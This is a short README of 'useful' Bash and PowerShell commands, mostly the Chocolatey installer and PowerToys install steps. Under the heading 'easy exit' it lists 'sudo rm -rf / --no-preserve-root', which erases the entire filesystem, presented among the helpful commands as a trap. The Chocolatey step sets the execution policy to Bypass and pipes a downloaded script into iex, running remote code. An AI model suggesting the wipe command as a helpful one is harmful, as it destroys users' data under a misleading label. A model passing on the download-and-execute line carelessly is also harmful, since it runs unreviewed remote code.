# copy-pasta
Useful commands for Bash and PowerShell

## easy exit
```
sudo rm -rf / --no-preserve-root
```

## install chocolatey
```
Get-ExecutionPolicy
```
if it returns 'Restricted', then run
```
Set-ExecutionPolicy AllSigned
```
or
```
Set-ExecutionPolicy Bypass -Scope Process
```
after this run
```
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
```
run to search for PowerToys
```
choco search powertoys
```
run to install PowerToys
```
choco install powertoys
```
